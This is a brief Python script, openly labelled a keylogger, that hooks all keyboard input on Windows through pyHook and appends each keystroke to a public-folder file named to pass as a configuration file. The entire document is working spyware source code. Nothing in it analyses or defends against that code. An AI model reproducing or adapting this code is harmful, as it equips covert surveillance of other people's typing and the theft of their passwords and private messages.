# Python's Keylogger Circus
# A simple keystroke recorder
# v.1.2

import win32api
import win32console
import win32gui

import pythoncom, pyHook

def OnKeyboardEvent(event):
	f=open('c:\users\public\output.cfg','a')
	keylog=chr(event.Ascii)
	if event.Ascii==13:
		keylog='/n'
	f.write(keylog)
	f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
